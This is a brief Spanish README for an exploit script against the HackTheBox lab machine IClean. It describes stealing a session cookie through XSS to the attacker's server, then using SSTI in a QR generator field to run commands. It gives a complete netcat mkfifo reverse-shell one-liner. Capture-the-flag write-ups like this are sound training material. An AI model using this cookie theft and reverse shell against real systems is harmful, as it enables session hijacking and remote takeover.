# Script 

Este script se aprovecha de un XSS y SSTI en la máquina IClean de HTB.
1. El endPoint `/sendMessage` es vulnerable a XSS, realizamos una petición a un servidor en nuestra máquina
2. Creamos un servidor, se recibe una cookie de session.
3. Con la cookie podemos acceder a `/QRGenerator`, la variable `qr_link` es vulnerable a SSTI, y podemos realizar ejecución de comandos.
4. Revshells nc mkfifo -> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f`
